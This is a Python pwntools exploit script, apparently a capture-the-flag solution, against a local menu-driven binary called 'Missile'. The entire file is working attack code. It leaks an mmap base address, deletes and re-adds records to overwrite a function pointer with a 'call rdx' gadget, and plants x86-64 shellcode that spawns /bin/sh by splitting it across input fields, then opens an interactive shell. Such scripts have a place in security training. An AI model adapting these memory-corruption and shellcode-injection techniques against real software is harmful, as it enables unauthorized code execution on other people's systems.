from pwn import *

p = process('./Missile')

def menu():
	p.recvuntil('Command : ')

def missile_add(i, name, loc):
	menu()
	p.sendline('2')
	menu()
	p.sendline('2')
	p.recvuntil('number : ')
	p.sendline(str(i))
	p.recvuntil('Name : ')
	p.send(name)
	p.recvuntil('location : ')
	p.send(loc)

	menu()
	p.sendline('5')

def weapon_add(i, name, loc):
	menu()
	p.sendline('1')
	menu()
	p.sendline('2')
	p.recvuntil('number : ')
	p.sendline(str(i))
	p.recvuntil('Name : ')
	p.sendline(name)
	p.recvuntil('Location : ')
	p.sendline(loc)

	menu()
	p.sendline('5')

def operator_add(name, part, rank):
	menu()
	p.sendline('3')
	menu()
	p.sendline('2')
	p.recvuntil('Name : ')
	p.send(name)
	p.recvuntil('Part : ')
	p.send(part)
	p.recvuntil('Rank : ')
	p.send(rank)

	menu()
	p.sendline('4')

def func_add(i, name, reason):
	menu()
	p.sendline('4')
	menu()
	p.sendline('3')

	p.recvuntil('number : ')
	p.sendline(str(i))
	p.recvuntil('Name : ')
	if len(name) == 40:
		p.send(name)
	else:
		p.sendline(name)
	p.recvuntil('Reasons : ')
	p.sendline(reason)

	menu()
	p.sendline('5')

def func_mod(i, name):
	menu()
	p.sendline('4')
	menu()
	p.sendline('1')

	p.recvuntil('Number : ')
	p.sendline(str(i))
	p.recvuntil('Name : ')
	p.sendline(name)

	menu()
	p.sendline('5')

def func_del(i):
	menu()
	p.sendline('4')
	menu()
	p.sendline('2')
	p.recvuntil('Number : ')
	p.sendline(str(i))

	menu()
	p.sendline('5')

jmp_rdx_0x17 = 0x004c1deb
call_rdx_0x30 = 0x004628e7

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

operator_add('A\n', sc[:20] + '\n', sc[20:] + '\n') # 0
missile_add(0, 'A' * 21, 'B' * 31 + 'EEEE')
menu()
p.sendline('2')
menu()
p.sendline('1')
p.recvuntil('EEEE')
leak = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
mmap_base = leak - 0x14
print 'mmap base: %s' % hex(mmap_base)
menu()
p.sendline('5')

func_del(2) # del missile
payload = 'A' * 32
payload += p64(call_rdx_0x30)[:-1]
func_add(0, payload, 'ff') # 0
func_mod(2, p64(mmap_base + 0x14))
menu()
p.sendline('2')

p.interactive()





